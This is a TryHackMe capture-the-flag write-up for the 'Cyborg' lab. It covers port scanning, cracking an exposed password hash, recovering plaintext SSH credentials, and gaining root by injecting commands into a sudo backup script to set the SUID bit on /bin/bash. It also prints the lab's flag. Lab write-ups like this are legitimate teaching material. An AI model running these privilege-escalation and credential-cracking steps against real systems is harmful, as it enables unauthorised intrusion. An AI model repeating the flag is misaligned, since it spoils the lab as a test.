# Cyborg — TryHackMe Writeup

##  Overview

This machine involves:

- Web enumeration
- Hash cracking
- Archive extraction (borg backup)
- Credential discovery
- Privilege escalation via insecure script

---

##  Port Scanning

Start with Nmap:

```bash
nmap -sV 10.80.181.182
````

### Results:

* **22/tcp** — SSH (OpenSSH 7.2p2)
* **80/tcp** — HTTP (Apache 2.4.18)

Total open ports: **2**

---

##  Web Enumeration

Run directory brute-force:

```bash
dirsearch -u http://10.80.181.182/
```

### Discovered paths:

* `/admin/`
* `/etc/`

---

##  Interesting Findings

### `/admin/`

Contains a simple webpage (no direct exploit).

### `/etc/`

Contains sensitive data:

```text
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```

This is a **hash (md5crypt)**.

---

##  Hash Cracking

Use John the Ripper:

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

### Result:

```text
squidward
```

---

##  Archive Extraction (Borg)

Use the cracked password to extract the archive:

```bash
borg extract home/field/dev/final_archive::music_archive
```

 Files are extracted locally.

---

##  Exploring Extracted Files

Navigate:

```bash
cd home/alex/Documents
cat note.txt
```

### Content:

```text
alex:S3cretP@s3
```

 Credentials discovered:

* **Username:** alex
* **Password:** S3cretP@s3

---

##  SSH Access

```bash
ssh alex@10.80.181.182
```

Login using the discovered credentials.

---

##  User Flag

Search for the flag:

```bash
find / -name user.txt 2>/dev/null
```

(Flag location may vary depending on extraction, but typically in user directory.)

---

##  Privilege Escalation

Check sudo permissions:

```bash
sudo -l
```

You can run:

```bash
sudo /etc/mp3backups/backup.sh
```

---

##  Script Analysis

Inspect the script:

```bash
cat /etc/mp3backups/backup.sh
```

Key part:

```bash
cmd=$($command)
echo $cmd
```

The script executes user-controlled input → **Command Injection vulnerability**

---

##  Exploitation

Test command execution:

```bash
sudo ./backup.sh -c whoami
```

Output:

```text
root
```

Confirmed command execution as root.

---

##  Get Root Shell

Set SUID bit on bash:

```bash
sudo ./backup.sh -c "chmod +s /bin/bash"
```

Then:

```bash
bash -p
```

```bash
whoami
```

```text
root
```

---

## 🏁 Root Flag

```bash
cat /root/root.txt
```

```text
flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
```

---

##  Conclusion

### Attack Chain:

1. Nmap scan → discover services
2. Directory brute-force → find `/etc` leak
3. Extract hash → crack with John
4. Access borg archive
5. Recover credentials (`alex`)
6. SSH login
7. Analyze backup script
8. Exploit command injection
9. Gain root via SUID bash

---

##  Tools Used

* Nmap
* Dirsearch
* John the Ripper
* Borg
* SSH

---

##  Key Vulnerabilities

* Sensitive data exposure (`/etc` directory)
* Weak password (crackable hash)
* Credentials stored in plaintext
* Command injection in privileged script
